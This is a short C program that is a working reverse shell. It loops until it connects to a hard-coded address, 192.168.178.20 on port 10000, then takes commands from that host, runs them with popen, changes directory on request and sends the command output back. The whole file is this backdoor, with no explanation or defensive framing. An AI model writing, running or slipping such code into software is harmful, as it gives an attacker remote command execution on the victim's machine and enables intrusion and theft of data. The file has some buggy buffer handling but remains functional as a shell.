#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netdb.h>
#include <unistd.h>
int main() {
	
	struct sockaddr_in server_addr; 
	struct hostent* server; 
	int server_sock; 

	char msg[500] = "[+] CONNECTED \n"; 
	char buf[500]; 
	
	
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	
	server_addr.sin_family = AF_INET; 
	server_addr.sin_port = htons(10000); 
	server_addr.sin_addr.s_addr = inet_addr("192.168.178.20"); 
	int err = 12321312; 
	
	while(err != 0) {
		sleep(2);
		err = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)); 
	}

	sleep(2); 
	send(sock, msg, sizeof(msg), 0);
	FILE *pipe; 
	char buffer[500]; 
	while (1) {


		memset(buf, 0, sizeof(buf));
		memset(buffer, 0, sizeof(buffer));
		recv(sock, buf, sizeof(buf), 0);

		sprintf(buf, "%s", buf);
		
		if(buf[0] == 'c' && buf[1] == 'd') {
			char *buf2 = buf + 3; 
			printf("%s\n", buf2);
			chdir(buf2);
			send(sock, "[+] Changed Directory\n", 60, 0);
		} else {
			pipe = popen(buf, "r"); 
			sprintf(buffer, "--------------------------\n");
			while(fgets(buf, sizeof(buf), pipe) != NULL) {
				sprintf(buffer, "%s%s", buffer, buf); 
			}
			sprintf(buffer, "%s--------------------------", buffer);

			send(sock, buffer, sizeof(buffer), 0);
		}
		if(strcmp(buf, "quit") == 0) {
			break;
		}

	}

	close(sock);

	
}
